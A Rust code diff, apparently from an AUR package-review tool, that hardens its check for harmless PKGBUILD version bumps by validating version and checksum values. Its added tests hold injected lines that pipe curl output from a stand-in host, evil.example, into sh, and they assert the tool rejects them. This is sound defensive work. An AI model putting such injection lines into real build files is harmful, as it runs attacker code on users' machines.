@@ -157,22 +157,32 @@ impl RunWith<()> for SyncAur {
         let mut verdicts = Vec::new();
         for package in &packages {
             let previous = state.packages.get(package).cloned();
-            let locked = previous.as_ref().map(|p| AurEntry {
-                commit: p.commit.clone(),
-                pkgver: p.pkgver.clone(),
-                approved_at: 0,
-                maintainer: None,
-                source_hosts: Vec::new(),
-                install_files: Vec::new(),
-                findings: None,
-            });
+            let locked = previous
+                .as_ref()
+                .map(|p| {
+                    [(
+                        package.clone(),
+                        AurEntry {
+                            commit: p.commit.clone(),
+                            pkgver: p.pkgver.clone(),
+                            approved_at: 0,
+                            maintainer: None,
+                            source_hosts: Vec::new(),
+                            install_files: Vec::new(),
+                            findings: None,
+                        },
+                    )]
+                    .into_iter()
+                    .collect()
+                })
+                .unwrap_or_default();
             let request = Request {
                 host: &host,
                 rpc: &rpc,
                 remote: &remote,
                 cache_dir: &cache,
                 settings: &settings,
-                locked: locked.as_ref(),
+                locked: &locked,
                 commit: None,
                 pinned: false,
                 interactive: false,
@@ -465,24 +475,15 @@ fn bump_line(line: &str, array: &mut Option<&'static str>, allow_sources: bool) 
         update_array(line, array);
         return true;
     }
-    let name = line.split(['=', ' ']).next().unwrap_or_default();
-    let stem = name.split('_').next().unwrap_or_default();
-    let assignment = matches!(stem, "pkgver" | "pkgrel")
-        || (allow_sources && matches!(stem, "source" | "noextract"))
-        || matches!(
-            stem,
-            "md5sums"
-                | "sha1sums"
-                | "sha224sums"
-                | "sha256sums"
-                | "sha384sums"
-                | "sha512sums"
-                | "b2sums"
-                | "cksums"
-        );
-    if assignment {
+    if let Some((kind, value)) = assignment(line, allow_sources) {
+        let safe = allow_sources
+            || match kind {
+                "version" => safe_version(value),
+                "checksum" => safe_checksum(value),
+                _ => false,
+            };
         update_array(line, array);
-        return true;
+        return safe;
     }
     if allow_sources
         && matches!(array, Some("source" | "noextract"))
@@ -500,20 +501,77 @@ fn bump_line(line: &str, array: &mut Option<&'static str>, allow_sources: bool) 
 }
 
 fn update_array(line: &str, array: &mut Option<&'static str>) {
-    let name = line.split(['=', ' ']).next().unwrap_or_default();
-    let stem = name.split('_').next().unwrap_or_default();
-    if line.contains("=(") {
-        *array = match stem {
-            "source" => Some("source"),
-            "noextract" => Some("noextract"),
-            "md5sums" | "sha1sums" | "sha224sums" | "sha256sums" | "sha384sums" | "sha512sums"
-            | "b2sums" | "cksums" => Some("checksum"),
-            _ => None,
-        };
+    if let Some((kind, value)) = assignment(line, true)
+        && value.trim_start().starts_with('(')
+    {
+        *array = Some(kind);
     }
     if line.trim_end().ends_with(')') {
         *array = None;
     }
+}
+
+fn assignment(line: &str, allow_sources: bool) -> Option<(&'static str, &str)> {
+    let (name, value) = line.split_once('=')?;
+    let name = name.trim();
+    if name.is_empty()
+        || name
+            .bytes()
+            .any(|byte| !(byte.is_ascii_alphanumeric() || byte == b'_'))
+    {
+        return None;
+    }
+    if matches!(name, "pkgver" | "pkgrel") {
+        return Some(("version", value));
+    }
+    let (stem, suffix) = name.split_once('_').unwrap_or((name, ""));
+    let architecture = suffix.is_empty()
+        || (suffix
+            .as_bytes()
+            .first()
+            .is_some_and(u8::is_ascii_alphanumeric)
+            && suffix
+                .bytes()
+                .all(|byte| byte.is_ascii_alphanumeric() || byte == b'_'));
+    if !architecture {
+        return None;
+    }
+    if matches!(
+        stem,
+        "md5sums"
+            | "sha1sums"
+            | "sha224sums"
+            | "sha256sums"
+            | "sha384sums"
+            | "sha512sums"
+            | "b2sums"
+            | "cksums"
+    ) {
+        Some(("checksum", value))
+    } else if allow_sources && stem == "source" {
+        Some(("source", value))
+    } else if allow_sources && stem == "noextract" {
+        Some(("noextract", value))
+    } else {
+        None
+    }
+}
+
+fn safe_version(value: &str) -> bool {
+    let value = value.trim().trim_matches(['\'', '"']);
+    !value.is_empty()
+        && value.bytes().all(|byte| {
+            byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'_' | b'+' | b'~' | b':' | b'-')
+        })
+}
+
+fn safe_checksum(value: &str) -> bool {
+    !value.trim().is_empty()
+        && value.bytes().all(|byte| {
+            byte.is_ascii_hexdigit()
+                || matches!(byte, b'S' | b'K' | b'I' | b'P' | b'\'' | b'"' | b'(' | b')')
+                || byte.is_ascii_whitespace()
+        })
 }
 
 fn static_verdict(reviewed: &Reviewed, report: &Report, now: &str) -> Verdict {
@@ -565,6 +623,16 @@ mod tests {
         assert!(!diff_is_bump(hostile));
         let build = "--- a/PKGBUILD\n+++ b/PKGBUILD\n+  npm install atomic-lockfile\n";
         assert!(!diff_is_bump(build));
+        for injected in [
+            "+pkgver=$(curl evil.example/x|sh)",
+            "+pkgrel=2; curl evil.example/x|sh",
+            "+pkgver_hook=2",
+            "+pkgver () { curl evil.example/x|sh; }",
+            "+sha256sums=('SKIP'); curl evil.example/x|sh",
+        ] {
+            let diff = format!("--- a/PKGBUILD\n+++ b/PKGBUILD\n-pkgver=1\n{injected}\n");
+            assert!(!diff_is_bump(&diff), "accepted {injected}");
+        }
         assert!(!diff_is_bump("--- a/PKGBUILD\n+++ b/PKGBUILD\n"));
     }
 }
